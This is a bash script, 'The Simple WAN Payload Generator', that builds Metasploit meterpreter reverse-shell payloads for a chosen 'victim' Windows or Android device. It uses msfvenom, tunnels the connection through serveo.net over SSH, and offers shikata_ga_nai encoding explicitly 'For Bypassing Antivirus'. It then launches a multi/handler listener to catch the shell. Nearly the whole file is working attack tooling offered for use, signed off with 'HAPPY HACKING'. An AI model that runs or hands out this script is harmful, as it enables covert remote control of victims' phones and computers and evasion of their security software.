echo "      __               , _    
       /\_\/o    ()     /|/ \   
   _  |    |     /\  __  |   |  
 |/ \_|    ||   /  \/  \_|   |  
 |__/  \__/ |_//(__/\__/ |   |_/
/|                              
\|   The Simple WAN Payload Generator"
echo -e "Give me the victim operating system\n1.windows\n2.android"
read t
echo "Give me the listening port(lport)"
read p
echo "What should be the name of your file??"
read n
name=$1
set 'who am i'
while true; do
    echo -e "Wanna Encode File(For Bypassing Antivirus)??\n1.Yess Please\n2.Naah!! I don't worry" 
   read y
    case $y in
        [1]* ) 
echo "okay!! $name give me a second"
gnome-terminal -x ssh -R $p:localhost:$p serveo.net
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net -e x86/shikata_ga_nai -i 2000 lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -e x86/shikata_ga_nai -i 2000  -o /root/Desktop/$n.exe
fi; break;;
        [2]* ) 
echo "okay!! $name give me a second"
gnome-terminal -x ssh -R $p:localhost:$p serveo.net
if [ $t -eq 2 ]
 then
 o='android'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p -o /root/Desktop/$n.apk
else 
 o='windows'
msfvenom -p $o/meterpreter/reverse_tcp lhost=serveo.net lport=$p  -o /root/Desktop/$n.exe
fi; break;;
        * ) echo "Please answer 1 or 2";;
    esac
done

echo "Done!!! Check your Desktop for file HAPPY HACKING@@@"
while true; do
    read -p "Wanna Start Listening(y/n) " yn
    case $yn in
        [Yy]* ) msfconsole -x "use multi/handler;set payload $o/meterpreter/reverse_tcp;set lhost serveo.net;set lport $p;exploit"; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
